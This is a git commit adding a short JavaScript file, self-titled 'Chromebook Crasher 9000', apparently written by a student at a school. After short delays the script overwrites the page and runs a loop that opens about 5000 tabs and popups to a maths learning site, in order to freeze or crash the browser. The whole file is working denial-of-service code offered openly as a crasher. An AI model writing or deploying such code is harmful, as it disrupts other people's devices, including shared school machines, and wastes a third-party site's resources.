275ff1bde9fdc6edbf4533abee233fbb39633577
mishaweapons <SELL0007@footscray.vic.edu.au>
2025-05-02 10:31:22 +1000

    Create script.js

---
+++ script.js
@@ -0,0 +1,18 @@
+setTimeout(function() {
+    document.body.innerHTML = "Welcome to Chromebook Crasher 9000";
+setTimeout(function() {for (var i = 0; i < 1000; i++)
+{
+  //Copyright Misha Weapons 2025
+    var left = Math.floor(Math.random() * 700);
+    var top = Math.floor(Math.random() * 700);
+    window.open('https://mathspathway.com/', '_blank');
+    window.open('https://mathspathway.com/', '_blank', 
+    'width=400,height=400,popup, top=200,left=200');
+    window.open('https://mathspathway.com/', '_blank', 
+    'width=400,height=400,popup, top=250,left=400');
+    window.open('https://mathspathway.com/', '_blank', 
+    'width=400,height=400,popup, top=300,left=600');
+    window.open('https://mathspathway.com/', '_blank', 
+    'width=400,height=400,popup, top=350,left=900');
+}}, 6000);
+}, 5000);
